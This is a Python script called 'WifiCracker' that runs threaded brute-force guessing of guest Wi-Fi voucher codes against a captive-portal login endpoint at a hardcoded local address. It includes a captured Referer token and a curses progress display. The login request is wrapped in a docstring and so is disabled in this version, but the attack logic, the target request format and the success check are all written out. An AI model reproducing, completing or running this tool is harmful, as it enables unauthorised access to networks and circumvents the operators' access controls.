import requests
import json
import random
import time
from colorama import Fore, Back, Style
import threading
import curses
import sys
import os

# Network_Arguments
headers = {
    'Referer': 'http://192.168.199.70:8880/guest/s/default/?ap=18:e8:29:99:df:99&ec=4sOV2kwv3zP_kCbUf83hB28ixUX4AWk1rhevRCPc8PcfH92GAeB334RT_kfH57Eo9oZlam_1yyjxrl0zCGvfJ1tJmeEneLwFqaWti3sQH6xfp0NkPalAh0mssKdq626jNTmwIjR4JBvA7mJImWo_c3dCjaBd9UpinxCxeu3JsV4',
}

data = {"by": "voucher", "voucher": "TOBEREPLACED"}

running = False
current_testing_list = None


def send(code):
    '''data["voucher"] = code
    response = requests.post('http://192.168.199.70:8880/guest/s/default/login',
                             headers=headers, data=json.dumps(data), verify=False)
    parsed_json = json.loads(response.text)
    global second_done
    global current_done
    if "ok" in response.text:
        print("You cracked the shit out of that router!")
        print("Iam impressed by your fuckability")
        exit()
    else:
        print("msg :", parsed_json["meta"]["msg"],
              "with code [", code, "]", current_done, "/ 99999999", "with rate of", second_done)'''
    time.sleep(0)


def crack(thread_number):
    global global_progress
    global running
    while not running:
        None

    done = 0
    old_time = time.time()
    time_counting = 0

    while running:
        random_number = random.randint(1000000000, 9999999999)

        global current_testing_list
        current_testing_list[thread_number][0] = random_number

        send(random_number)
        done += 1
        global_progress += 1
        time_counting += time.time() - old_time
        old_time = time.time()

        if time_counting >= 1:
            current_testing_list[thread_number][1] = done
            time_counting = 0
            done = 0


def create_threads(thread_count):
    global current_testing_list
    current_testing_list = [[None] * 2 for _ in range(int(thread_count))]

    print()

    for i in range(int(thread_count)):
        thread_number_string = str(i+1).ljust(2)
        print("Thread [" + Fore.GREEN + thread_number_string +
              Style.RESET_ALL + "] : ...", end="\r")

        th = threading.Thread(target=crack, args=(i,))
        th.start()

        print("Thread [" + Fore.GREEN + thread_number_string +
              Style.RESET_ALL + "] : " + Fore.GREEN + "READY!" + Style.RESET_ALL)

    print()


def do_we_wanna_run():
    global running
    input_ = input(Fore.RED + "Shall we beginn? (yes|no) ")
    if input_ == "yes":
        running = True
    elif input_ == "no":
        print()
        print(Fore.RED + "Bye!")
        exit()
    else:
        print()
        print(Fore.RED + "'" + input_ + "'", "is not wanted!" + Style.RESET_ALL)
        print()


def draw_border(x1, y1, width, height, x_char="x", y_char="x", corner_char="x"):

    for x in range(width):
        console.addstr(y1, x1+x, x_char)
        console.addstr(y1+height, x1+x, x_char)

    for y in range(height+1):
        console.addstr(y1+y, x1, y_char)
        console.addstr(y1+y, x1+width, y_char)

    console.addstr(y1, x1, corner_char)
    console.addstr(y1+height, x1, corner_char)
    console.addstr(y1, x1+width, corner_char)
    console.addstr(y1+height, x1+width, corner_char)


def getMiddleX(length, offset=0,):
    return int(console.getmaxyx()[1] / 2 - length / 2 + offset)


def getMiddleY(height, offset=0):
    return int(console.getmaxyx()[0] / 2 - height / 2 + offset)


def print_testing_list(console):
    console.erase()
    dims = console.getmaxyx()

    global current_testing_list
    title = "Currently [" + str(len(current_testing_list)) + \
        "] Threads are trying to crack the code:"
    console.addstr(1, getMiddleX(len(title)), title, curses.color_pair(4))

    console.addstr(3, getMiddleX(len(".-Thread-Pool-.")), ".-Thread-Pool-.", curses.color_pair(1))

    i = 0
    posX = 0
    string_length = 0
    for info in current_testing_list:
        thread_number = "[" + str(i+1).ljust(2) + "] : "
        thread_info = str(info[0]) + " | (Rate:" + str(info[1]) + "/s)"
        string_length = len(thread_number) + len(thread_info)
        posX = getMiddleX(string_length)
        # Number of Thread
        console.addstr(i+5, posX, thread_number, curses.color_pair(1))
        # Thread Infos
        console.addstr(i+5, posX + len(thread_number), thread_info, curses.color_pair(2))
        i += 1

    draw_border(posX-2, 4, string_length + 3, len(current_testing_list) + 1, "-", "|", "o")

    global global_progress
    progress = str(global_progress)
    console.addstr(len(current_testing_list) + 6, getMiddleX(1), "↡")
    console.addstr(len(current_testing_list) + 7, getMiddleX(len(progress)),
                   progress, curses.color_pair(3))

    console.refresh()


def setup_prining_stuff(console):
    curses.curs_set(0)

    if curses.has_colors():
        curses.start_color()
        curses.use_default_colors()
        curses.init_pair(1, curses.COLOR_WHITE, -1)  # Default
        curses.init_pair(2, curses.COLOR_RED, -1)  # Wrong
        curses.init_pair(3, curses.COLOR_YELLOW, -1)  # Warning
        curses.init_pair(4, curses.COLOR_GREEN, -1)  # Good


def update_progress():
    global global_progress_read
    global progress_running_time
    global progress_delta_time

    progress_delta_time = time.time() - progress_delta_time
    progress_running_time += progress_delta_time
    if progress_running_time >= 1:
        progress_running_time = 0
        global_progress_read = 0


if __name__ == '__main__':
    # console
    console = None

    # Settings
    thread_count = 5  # Default Value for Automode
    auto = False  # No questions asked in script
    mode = 0  # Defaut mode = 0 | Automatic mode = 1 | Manual Mode = 2

    # Take Script Arguments
    if len(sys.argv) == 2:
        if sys.argv[1] == "-auto":
            print("Automatic Mode is enabled")
            mode = 1
            auto = True
    elif len(sys.argv) == 3:
        if sys.argv[1] == "-m":
            mode = 2
            auto = True
            thread_count = int(sys.argv[2])

    # Progress
    global_progress = 0
    global_progess_read = 0
    progress_running_time = 0
    progress_delta_time = time.time()

    print(Fore.GREEN + " __      ___  __ _ " + Fore.RED + "   ___             _           ")
    print(Fore.GREEN + " \ \    / (_)/ _(_)" + Fore.RED + "  / __|_ _ __ _ __| |_____ _ _ ")
    print(Fore.GREEN + "  \ \/\/ /| |  _| |" + Fore.RED + " | (__| '_/ _` / _| / / -_) '_|")
    print(Fore.GREEN + "   \_/\_/ |_|_| |_|" + Fore.RED + "  \___|_| \__,_\__|_\_\___|_|  ")
    print()

    print(Fore.GREEN + "Version: Alpha 1")
    print()

    if auto == False:
        print(Style.BRIGHT + "o You are currently in tutorial mode " + Style.BRIGHT + "o")
        print(Style.BRIGHT + "|"+Style.RESET_ALL + Fore.GREEN +
              " -> add '-auto' for auto 5 threads  " + Style.BRIGHT + "|")
        print(Style.BRIGHT + "|"+Style.RESET_ALL + Fore.GREEN +
              " -> add '-m' and '5' for 5 threads  " + Style.BRIGHT + "|")
        print(Style.BRIGHT + "o------------------------------------o" + Style.RESET_ALL)
        print()

        thread_count = input(Fore.RED + "How many threads shall we start? ")
        create_threads(thread_count)
        do_we_wanna_run()
    else:
        if mode == 1:
            print(Style.BRIGHT + "o You are currently in automatic mode o" + Style.RESET_ALL)
        elif mode == 2:
            print(Style.BRIGHT + "o You are currently in manual mode o" + Style.RESET_ALL)
        create_threads(thread_count)
        running = True

    console = curses.initscr()
    console.clear()
    setup_prining_stuff(console)
    try:
        while running:
            print_testing_list(console)
            update_progress()
    except KeyboardInterrupt:
        curses.curs_set(1)
        curses.endwin()
        print("---------------------------------")
        print(Fore.RED + "Exiting!")
        print("Tryed codes : " + str(global_progress))
        os._exit(0)
